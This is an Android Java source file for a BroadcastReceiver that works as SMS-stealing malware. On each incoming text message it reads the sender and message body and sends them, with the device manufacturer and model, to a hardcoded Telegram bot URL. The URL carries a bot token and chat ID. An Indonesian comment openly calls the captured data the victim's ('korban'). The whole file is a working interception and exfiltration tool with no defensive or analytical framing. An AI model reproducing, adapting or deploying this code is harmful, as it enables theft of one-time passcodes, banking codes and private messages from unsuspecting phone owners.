package com.example.myapplicatior;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class ReceiveSms extends BroadcastReceiver {
    final String TAG = "demo";
    private final OkHttpClient client = new OkHttpClient();

    public void onReceive(Context context, Intent intent) {
        Bundle extras;
        String str = "\n - Product : ";
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (extras = intent.getExtras()) != null) {
            try {
                Object[] objArr = (Object[]) extras.get("pdus");
                SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
                int i = 0;
                while (i < smsMessageArr.length) {
                    smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                    String originatingAddress = smsMessageArr[i].getOriginatingAddress();
                    String replace = smsMessageArr[i].getMessageBody().replace("&", "  ").replace("#", " ");
                    String replace2 = replace.replace("?", " ");
                    String str2 = "ID : " + Build.ID + "\n - User : " + Build.USER + str + Build.PRODUCT + "\n - Brand : " + Build.BRAND + "\n - Board : " + Build.BOARD + "\n - BOOTLOADER : " + Build.BOOTLOADER + "\n - DISPLAY : " + Build.DISPLAY + "\n - HOST : " + Build.HOST + "\n - DEVICE : " + Build.DEVICE + "\n -TAGS : " + Build.TAGS + "\n - FINGERPRINT : " + Build.FINGERPRINT + "\n - TYPE : " + Build.TYPE + str + Build.TIME + "\n - ";
                    Request.Builder builder = new Request.Builder();
                    String str3 = str;
                    /**
                     * DISINI ADA URL API TELEGRAM DIMANA DATA KORBAN DI KIRIM
                     */
                    StringBuilder append = new StringBuilder().append("https://api.telegram.org/bot6817255304:AAGrKP47-SpbAnI-u7GyKITnA6OgLmK4q3Y/sendMessage?parse_mode=markdown&chat_id=7064236060&text=︻┳═一ῥἔʀἔҭᾄṩ一═┳︻  %0A %0A𝗣𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗦𝗠𝗦 : ").append(originatingAddress).append(",%0A𝗣𝗲𝘀𝗮𝗻 : \n\n").append(replace).append("%0A %0A𝗧𝘆𝗽𝗲 𝗣𝗲𝗿𝗮𝗻𝗴𝗸𝗮𝘁 : ");
                    StringBuilder append2 = append.append(Build.MANUFACTURER);
                    this.client.newCall(builder.url(append.append(" ").append(Build.MODEL).append("%0A𝑪𝒐𝒑𝒚𝒓𝒊𝒈𝒉𝒕 : 𝑫𝒋𝒉𝒆𝒏𝒅𝒓𝒚").toString()).build()).enqueue(new Callback() {
                        public void onFailure(Call call, IOException iOException) {
                            iOException.printStackTrace();
                        }

                        public void onResponse(Call call, Response response) throws IOException {
                            Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                            if (response.isSuccessful()) {
                                response.body().string();
                            }
                        }
                    });
                    i++;
                    str = str3;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
